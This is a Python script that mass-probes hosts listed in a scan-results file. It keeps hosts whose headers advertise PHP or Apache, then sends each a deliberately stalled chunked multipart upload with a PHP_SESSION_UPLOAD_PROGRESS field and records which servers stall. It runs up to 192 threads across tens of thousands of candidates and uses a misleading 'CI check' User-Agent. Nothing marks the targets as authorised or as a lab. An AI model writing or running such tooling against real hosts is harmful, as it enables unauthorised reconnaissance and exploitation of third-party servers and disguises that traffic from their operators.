import argparse
import json
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

APP_PORTS = {8080, 8000, 8888, 8088, 8001, 8002, 8090}
PHP_MARKERS = (b"php", b"apache", b"x-powered-by")


def load_targets(hits_path, ports):
    """Return ordered, de-duplicated (host, port) pairs within the port set."""
    try:
        raw = json.load(open(hits_path))
    except (OSError, ValueError):
        return []
    out, seen = [], set()
    for rec in raw:
        ip = rec.get("ip")
        if not ip:
            continue
        for p in rec.get("ports", []):
            port = p.get("port")
            if port in ports and (ip, port) not in seen:
                seen.add((ip, port))
                out.append((ip, port))
    return out


def head_looks_like_php(host, port, timeout):
    """Cheap HEAD probe; True only when headers advertise PHP/Apache."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(
            (
                f"HEAD / HTTP/1.0\r\nHost: {host}\r\n"
                "User-Agent: Mozilla/5.0 (compatible; CI check)\r\n\r\n"
            ).encode()
        )
        buf = b""
        while len(buf) < 4096:
            chunk = s.recv(1024)
            if not chunk:
                break
            buf += chunk
            if b"\r\n\r\n" in buf:
                break
        s.close()
    except OSError:
        return False
    head = buf.split(b"\r\n\r\n", 1)[0].lower()
    return any(m in head for m in PHP_MARKERS)


def stalled_multipart_probe(host, port, stall, timeout):
    """Stalled multipart upload-progress body, held past min_freq."""
    boundary = "----probe"
    body1 = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + "A" * 512
        + f"\r\n--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
    )
    head = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n\r\n"
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, int(port)))
        s.sendall(head.encode())
        b = body1.encode()
        s.sendall(f"{len(b):X}\r\n".encode() + b + b"\r\n")
        s.sendall(b"1\r\nA\r\n")
        time.sleep(stall)
        b2 = ("B" * 2048).encode()
        s.sendall(f"{len(b2):X}\r\n".encode() + b2 + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        try:
            resp = s.recv(256)
        except socket.timeout:
            resp = b""
        if resp.startswith(b"HTTP/"):
            return "STALLED " + resp.split(b"\r\n")[0].decode("latin-1", "replace")
        if resp == b"":
            return "STALLED no-response"
        return "RESPONDED"
    except socket.timeout:
        return "TIMEOUT"
    except ConnectionResetError:
        return "RESET"
    except OSError as e:
        return "ERR " + e.__class__.__name__
    finally:
        try:
            s.close()
        except OSError:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--hits", default="hits.json")
    ap.add_argument("--out", required=True)
    ap.add_argument("--mode", choices=["app", "web"], default="app")
    ap.add_argument("--workers", type=int, default=192)
    ap.add_argument("--timeout", type=float, default=3.0)
    ap.add_argument("--stall", type=float, default=1.4)
    ap.add_argument("--budget", type=int, default=900)
    args = ap.parse_args()

    wanted = APP_PORTS if args.mode == "app" else {80, 443}
    targets = load_targets(args.hits, wanted)
    print(f"mode={args.mode} candidates={len(targets)}", flush=True)

    start = time.time()
    tested = stalled = 0

    with open(args.out, "a", buffering=1) as fh, ThreadPoolExecutor(
        max_workers=args.workers
    ) as pool:
        pending = {}
        queue = list(targets)

        # Stage the PHP prefilter in PARALLEL. A serial HEAD against tarpit
        # hosts (accept + never reply) costs up to `timeout` per host, which
        # starves the whole budget before a single real probe runs — the
        # exact web-job failure (mode=web 41805 candidates -> 0 tested).
        if args.mode == "web":
            pf_timeout = max(1.0, min(args.timeout, 2.0))
            survivors = set()
            with ThreadPoolExecutor(max_workers=args.workers) as pf_pool:
                fut2t = {
                    pf_pool.submit(head_looks_like_php, h, p, pf_timeout): (h, p)
                    for h, p in queue
                }
                for fut in as_completed(fut2t):
                    try:
                        if fut.result():
                            survivors.add(fut2t[fut])
                    except Exception:  # noqa: BLE001
                        pass
            print(f"prefilter survivors: {len(survivors)}/{len(queue)}", flush=True)
            queue = [(h, p) for (h, p) in queue if (h, p) in survivors]

        def admit(host, port):
            return pool.submit(
                stalled_multipart_probe, host, port, args.stall, args.timeout
            )

        window = args.workers * 4
        while queue and len(pending) < window:
            h, p = queue.pop(0)
            fut = admit(h, p)
            if fut is not None:
                pending[fut] = (h, p)

        while pending:
            if time.time() - start > args.budget:
                print("BUDGET EXHAUSTED, stopping early", flush=True)
                break
            for fut in as_completed(list(pending)):
                h, p = pending.pop(fut)
                try:
                    verdict = fut.result()
                except Exception as e:  # noqa: BLE001
                    verdict = "ERR " + e.__class__.__name__
                tested += 1
                if verdict.startswith("STALLED"):
                    stalled += 1
                fh.write(f"{h}:{p} - {verdict}\n")
                fh.flush()
                while queue and len(pending) < window:
                    nh, np_ = queue.pop(0)
                    nf = admit(nh, np_)
                    if nf is not None:
                        pending[nf] = (nh, np_)
                break

    print(f"done tested={tested} stalled={stalled}", flush=True)
    with open("summary.txt", "w") as f:
        f.write(f"mode={args.mode} tested={tested} stalled={stalled}\n")


if __name__ == "__main__":
    main()
